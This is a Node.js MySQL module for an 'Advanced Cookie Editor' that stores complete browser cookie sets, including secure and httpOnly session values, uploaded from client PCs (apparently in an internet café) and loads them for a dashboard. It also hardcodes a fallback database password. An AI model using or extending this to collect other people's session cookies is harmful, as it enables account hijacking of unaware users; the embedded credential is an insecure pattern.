/**
 * MySQL Database Module for Advanced Cookie Editor
 * Persists PC client cookies, snapshots, and individual cookie items in MySQL.
 */

const mysql = require('mysql2/promise');

const DB_CONFIG = {
  host: process.env.DB_HOST || '127.0.0.1',
  port: parseInt(process.env.DB_PORT || '3306', 10),
  user: process.env.DB_USER || 'warnet_user',
  password: process.env.DB_PASSWORD || 'chaerul!26',
  database: process.env.DB_NAME || 'warnet',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
};

let pool = null;

function getPool() {
  if (!pool) {
    pool = mysql.createPool(DB_CONFIG);
  }
  return pool;
}

function cleanDomain(d) {
  if (!d) return 'unknown';
  return d.replace(/^\.+/, '').trim().toLowerCase();
}

/**
 * Initialize database tables if not existing
 */
async function initDb() {
  const p = getPool();
  try {
    // 1. Table for PC Snapshots (Primary view for dashboard)
    await p.query(`
      CREATE TABLE IF NOT EXISTS client_cookie_snapshots (
        pc_name VARCHAR(100) NOT NULL PRIMARY KEY,
        client_ip VARCHAR(45) NOT NULL,
        item_count INT NOT NULL DEFAULT 0,
        is_encrypted TINYINT(1) NOT NULL DEFAULT 0,
        domain_count INT NOT NULL DEFAULT 0,
        domains_json LONGTEXT,
        cookies_json LONGTEXT NOT NULL,
        saved_at DATETIME NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_saved_at (saved_at)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
    `);

    // 2. Table for granular individual cookies per PC & domain
    await p.query(`
      CREATE TABLE IF NOT EXISTS client_cookie_items (
        id BIGINT AUTO_INCREMENT PRIMARY KEY,
        pc_name VARCHAR(100) NOT NULL,
        cookie_name VARCHAR(255) NOT NULL,
        cookie_domain VARCHAR(255) NOT NULL,
        cookie_path VARCHAR(255) NOT NULL DEFAULT '/',
        cookie_value MEDIUMTEXT,
        secure TINYINT(1) NOT NULL DEFAULT 0,
        http_only TINYINT(1) NOT NULL DEFAULT 0,
        same_site VARCHAR(50) DEFAULT 'unspecified',
        is_session TINYINT(1) NOT NULL DEFAULT 0,
        expiration_date DOUBLE DEFAULT NULL,
        saved_at DATETIME NOT NULL,
        INDEX idx_pc (pc_name),
        INDEX idx_domain (cookie_domain),
        INDEX idx_pc_domain (pc_name, cookie_domain)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
    `);

    console.log('[+] MySQL tables initialized successfully in database: ' + DB_CONFIG.database);
    return true;
  } catch (err) {
    console.error('[-] Error initializing MySQL tables:', err.message);
    throw err;
  }
}

/**
 * Upsert PC cookies snapshot into MySQL
 * @param {string} pcName
 * @param {string} clientIp
 * @param {Array} cookies
 * @param {boolean} isEncrypted
 * @param {string} scopeDomain
 */
async function saveCookiesToDb(pcName, clientIp, cookies, isEncrypted = false, scopeDomain = 'all') {
  const p = getPool();
  const domainsSet = new Set();
  
  if (scopeDomain && scopeDomain !== 'all') {
    domainsSet.add(cleanDomain(scopeDomain));
  }

  for (const c of cookies) {
    if (c && c.domain) {
      domainsSet.add(cleanDomain(c.domain));
    }
  }

  const domainsList = Array.from(domainsSet);
  const now = new Date();
  const nowSql = now.toISOString().slice(0, 19).replace('T', ' ');

  // 1. Update / Insert PC snapshot
  await p.query(`
    INSERT INTO client_cookie_snapshots 
      (pc_name, client_ip, item_count, is_encrypted, domain_count, domains_json, cookies_json, saved_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ON DUPLICATE KEY UPDATE
      client_ip = VALUES(client_ip),
      item_count = VALUES(item_count),
      is_encrypted = VALUES(is_encrypted),
      domain_count = VALUES(domain_count),
      domains_json = VALUES(domains_json),
      cookies_json = VALUES(cookies_json),
      saved_at = VALUES(saved_at);
  `, [
    pcName,
    clientIp,
    cookies.length,
    isEncrypted ? 1 : 0,
    domainsList.length,
    JSON.stringify(domainsList),
    JSON.stringify(cookies),
    nowSql
  ]);

  // 2. Batch update client_cookie_items for this PC
  try {
    await p.query('DELETE FROM client_cookie_items WHERE pc_name = ?', [pcName]);
    
    if (cookies.length > 0) {
      const CHUNK_SIZE = 400;
      for (let i = 0; i < cookies.length; i += CHUNK_SIZE) {
        const chunk = cookies.slice(i, i + CHUNK_SIZE);
        const rows = chunk.map(c => [
          pcName,
          String(c.name || '').substring(0, 255),
          cleanDomain(c.domain || 'unknown').substring(0, 255),
          String(c.path || '/').substring(0, 255),
          String(c.value || ''),
          c.secure ? 1 : 0,
          c.httpOnly ? 1 : 0,
          String(c.sameSite || 'unspecified').substring(0, 50),
          c.session ? 1 : 0,
          typeof c.expirationDate === 'number' ? c.expirationDate : null,
          nowSql
        ]);

        await p.query(`
          INSERT INTO client_cookie_items 
            (pc_name, cookie_name, cookie_domain, cookie_path, cookie_value, secure, http_only, same_site, is_session, expiration_date, saved_at)
          VALUES ?
        `, [rows]);
      }
    }
  } catch (itemErr) {
    console.error('[-] Warning: error populating client_cookie_items:', itemErr.message);
  }

  return {
    pcName,
    clientIp,
    itemCount: cookies.length,
    domainCount: domainsList.length,
    domains: domainsList,
    savedAt: now.toISOString()
  };
}

/**
 * Load all PC records from MySQL for the dashboard
 */
async function loadAllRecordsFromDb() {
  const p = getPool();
  const [rows] = await p.query(`
    SELECT pc_name, client_ip, item_count, is_encrypted, domains_json, cookies_json, saved_at
    FROM client_cookie_snapshots
    ORDER BY saved_at DESC;
  `);

  const pcSet = new Set();
  const domainSet = new Set();
  let totalCookies = 0;
  let plainCount = 0;
  let encryptedCount = 0;

  const records = [];

  for (const row of rows) {
    pcSet.add(row.pc_name);
    let domains = [];
    try {
      domains = JSON.parse(row.domains_json || '[]');
    } catch (_) {
      domains = [];
    }

    let cookies = [];
    try {
      cookies = JSON.parse(row.cookies_json || '[]');
    } catch (_) {
      cookies = [];
    }

    for (const d of domains) domainSet.add(d);
    totalCookies += (row.item_count || 0);

    if (row.is_encrypted) {
      encryptedCount += (row.item_count || 0);
    } else {
      plainCount += (row.item_count || 0);
    }

    records.push({
      id: 'pc_' + row.pc_name.replace(/[^a-zA-Z0-9_-]/g, '_'),
      pcName: row.pc_name,
      clientIp: row.client_ip,
      savedAt: row.saved_at instanceof Date ? row.saved_at.toISOString() : String(row.saved_at),
      isEncrypted: Boolean(row.is_encrypted),
      passwordProtected: Boolean(row.is_encrypted),
      itemCount: row.item_count,
      domains,
      cookies,
      rawPayload: {
        pc: row.pc_name,
        domain: 'all',
        isEncrypted: Boolean(row.is_encrypted),
        cookies
      }
    });
  }

  return {
    stats: {
      totalPcs: pcSet.size,
      totalDomains: domainSet.size,
      totalCookies,
      plainCount,
      encryptedCount
    },
    records
  };
}

/**
 * Delete a specific PC or all PCs from database
 * @param {string} pcTarget
 */
async function deletePcFromDb(pcTarget) {
  const p = getPool();
  let deletedCount = 0;

  if (pcTarget === 'all') {
    const [res1] = await p.query('DELETE FROM client_cookie_snapshots');
    await p.query('DELETE FROM client_cookie_items');
    deletedCount = res1.affectedRows || 0;
  } else {
    const [res1] = await p.query('DELETE FROM client_cookie_snapshots WHERE pc_name = ?', [pcTarget]);
    await p.query('DELETE FROM client_cookie_items WHERE pc_name = ?', [pcTarget]);
    deletedCount = res1.affectedRows || 0;
  }

  return deletedCount;
}

/**
 * Remove all dummy data from database
 */
async function clearDummyData() {
  const p = getPool();
  // Delete known test records like 'PC-02', 'Cookie Browser Android APK', or test entries
  const dummyNames = ['PC-02', 'Cookie Browser Android APK', 'Cookie Browser APK'];
  await p.query('DELETE FROM client_cookie_snapshots WHERE pc_name IN (?)', [dummyNames]);
  await p.query('DELETE FROM client_cookie_items WHERE pc_name IN (?)', [dummyNames]);
  console.log('[+] Cleared any dummy test entries from MySQL');
}

module.exports = {
  getPool,
  initDb,
  saveCookiesToDb,
  loadAllRecordsFromDb,
  deletePcFromDb,
  clearDummyData
};
